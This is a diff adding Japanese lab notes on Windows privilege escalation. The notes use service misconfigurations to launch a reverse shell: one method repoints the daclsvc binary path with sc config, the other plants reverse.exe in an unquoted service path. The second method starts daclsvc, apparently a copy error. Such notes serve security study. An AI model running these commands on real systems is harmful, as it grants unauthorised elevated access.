@@ -1,2 +1,16 @@
-
+1. daclsvc を利用したリバースシェルの実行
+・条件：
 SERVICE_CHANGE_CONFIG サービスの起動時に任意の実行ファイルを開始するようにシステムを設定できる
+・方法：
+以下のコマンドで、実行パスを変更する。
+sc config daclsvc binpath= "\"C:\PrivEsc\reverse.exe\""
+net start daclsvc で サービス実行すると、reverse.exe が起動する
+
+2. unquotedsvc を利用したリバースシェルの実行
+・条件
+C:\Program Files\Unquoted Path Service\ への書込権限が必要
+・方法
+以下のコマンドで、Common.exe ファイルを作成する。
+copy C:\PrivEsc\reverse.exe "C:\Program Files\Unquoted Path Service\Common.exe"
+net start daclsvc で サービス実行すると、reverse.exe が起動する
+
